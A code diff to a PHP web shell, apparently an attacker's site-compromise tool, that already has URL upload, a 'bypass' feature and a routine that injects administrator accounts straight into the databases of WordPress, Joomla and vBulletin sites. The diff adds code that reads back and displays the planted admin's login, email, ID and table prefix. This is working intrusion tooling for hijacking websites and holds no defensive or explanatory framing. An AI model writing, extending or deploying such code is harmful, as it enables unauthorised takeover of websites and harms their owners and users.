@@ -144,6 +144,7 @@ $bypass_output = '';
 $gs_output = '';
 $cms_admin_msg = '';
 $cms_prefix_suggestions = array();
+$cms_admin_details = '';
 
 // === UPLOAD FROM URL ===
 if (isset($_POST['upload_url']) && $_POST['upload_url'] !== '') {
@@ -380,19 +381,33 @@ if (isset($_POST['cms_add_admin']) && isset($_POST['cms_type'])) {
                     @mysql_query("UPDATE `".$users_table."` SET user_pass='".$hp."', user_email='".$ae."' WHERE ID=".$uid);
                     $cms_admin_msg = 'Updated existing WordPress user ID '.$uid;
                 } else {
-                    $reg = mysql_real_escape_string(date('Y-m-d H:i:s'));
+                    $reg = mysql_real_escape_string(date('Y-m-d H:i:s'), $link);
                     $ins = @mysql_query("INSERT INTO `".$users_table."` (user_login,user_pass,user_nicename,user_email,user_registered,user_status,display_name) VALUES ('".$au."','".$hp."','".$au."','".$ae."','".$reg."',0,'".$disp."')");
                     if (!$ins) {
                         $cms_admin_msg = 'Insert user failed: '.htmlspecialchars(mysql_error($link));
                     } else {
-                        $uid = mysql_insert_id();
+                        $uid = mysql_insert_id($link);
                         // capabilities
                         $cap_key = $prefix . 'capabilities';
                         $lvl_key = $prefix . 'user_level';
-                        $caps = mysql_real_escape_string(serialize(array('administrator'=>true)));
+                        $caps = mysql_real_escape_string(serialize(array('administrator'=>true)), $link);
                         @mysql_query("INSERT INTO `".$umeta_table."` (user_id, meta_key, meta_value) VALUES (".$uid.", '".$cap_key."', '".$caps."')");
                         @mysql_query("INSERT INTO `".$umeta_table."` (user_id, meta_key, meta_value) VALUES (".$uid.", '".$lvl_key."', '10')");
                         $cms_admin_msg = 'WordPress admin user created ID '.$uid;
+                    }
+                }
+                // Ambil detail user (jika ada $uid)
+                if (isset($uid)) {
+                    $detailRes = @mysql_query("SELECT ID,user_login,user_email,user_registered,display_name FROM `".$users_table."` WHERE ID=".$uid." LIMIT 1", $link);
+                    if ($detailRes && mysql_num_rows($detailRes) === 1) {
+                        $d = mysql_fetch_assoc($detailRes);
+                        $cms_admin_details = 'ID: '.htmlspecialchars($d['ID'])."\n".
+                            'Login: '.htmlspecialchars($d['user_login'])."\n".
+                            'Email: '.htmlspecialchars($d['user_email'])."\n".
+                            'Registered: '.htmlspecialchars($d['user_registered'])."\n".
+                            'Display: '.htmlspecialchars($d['display_name'])."\n".
+                            'Table Prefix: '.htmlspecialchars($prefix)."\n".
+                            'CMS: WordPress';
                     }
                 }
             } elseif ($cms_type === 'joomla') {
@@ -426,6 +441,18 @@ if (isset($_POST['cms_add_admin']) && isset($_POST['cms_type'])) {
                         $cms_admin_msg = 'Joomla admin user created ID '.$uid;
                     }
                 }
+                if (isset($uid)) {
+                    $detailRes = @mysql_query("SELECT id as ID, username, email, registerDate FROM `".$users_table."` WHERE id=".$uid." LIMIT 1", $link);
+                    if ($detailRes && mysql_num_rows($detailRes)===1) {
+                        $d = mysql_fetch_assoc($detailRes);
+                        $cms_admin_details = 'ID: '.htmlspecialchars($d['ID'])."\n".
+                            'Username: '.htmlspecialchars($d['username'])."\n".
+                            'Email: '.htmlspecialchars($d['email'])."\n".
+                            'Registered: '.htmlspecialchars($d['registerDate'])."\n".
+                            'Table Prefix: '.htmlspecialchars($prefix)."\n".
+                            'CMS: Joomla';
+                    }
+                }
             } elseif ($cms_type === 'vbulletin') {
                 // Simplified vBulletin (may fail if schema differs)
                 $users_table = $prefix . 'user';
@@ -449,6 +476,19 @@ if (isset($_POST['cms_add_admin']) && isset($_POST['cms_type'])) {
                     } else {
                         $uid = mysql_insert_id();
                         $cms_admin_msg = 'vBulletin admin user inserted ID '.$uid.' (minimal fields).';
+                    }
+                }
+                if (isset($uid)) {
+                    $detailRes = @mysql_query("SELECT userid as ID, username, email, joindate FROM `".$users_table."` WHERE userid=".$uid." LIMIT 1", $link);
+                    if ($detailRes && mysql_num_rows($detailRes)===1) {
+                        $d = mysql_fetch_assoc($detailRes);
+                        $joind = isset($d['joindate']) ? date('Y-m-d H:i:s', intval($d['joindate'])) : '';
+                        $cms_admin_details = 'ID: '.htmlspecialchars($d['ID'])."\n".
+                            'Username: '.htmlspecialchars($d['username'])."\n".
+                            'Email: '.htmlspecialchars($d['email'])."\n".
+                            'Joined: '.htmlspecialchars($joind)."\n".
+                            'Table Prefix: '.htmlspecialchars($prefix)."\n".
+                            'CMS: vBulletin';
                     }
                 }
             }
@@ -1512,6 +1552,12 @@ if (!$disabled_funcs) {
                     <div class="alert <?php echo strpos($cms_admin_msg,'created')!==false || strpos($cms_admin_msg,'Updated')!==false || strpos($cms_admin_msg,'loaded')!==false ? 'alert-success':'alert-danger'; ?>" style="margin-top:12px;">
                         <?php echo htmlspecialchars($cms_admin_msg); ?>
                     </div>
+                    <?php if ($cms_admin_details): ?>
+                        <div style="margin-top:10px;">
+                            <label style="display:block;margin-bottom:6px;color:#a9c0e8;font-weight:600;">New Admin Details</label>
+                            <textarea readonly style="width:100%;min-height:140px;background:#041022;color:#e6eef8;border:1px solid rgba(255,255,255,0.05);border-radius:8px;padding:12px;font-family:monospace;white-space:pre;overflow:auto;"><?php echo $cms_admin_details; ?></textarea>
+                        </div>
+                    <?php endif; ?>
                 <?php endif; ?>
             </div>
         </div>
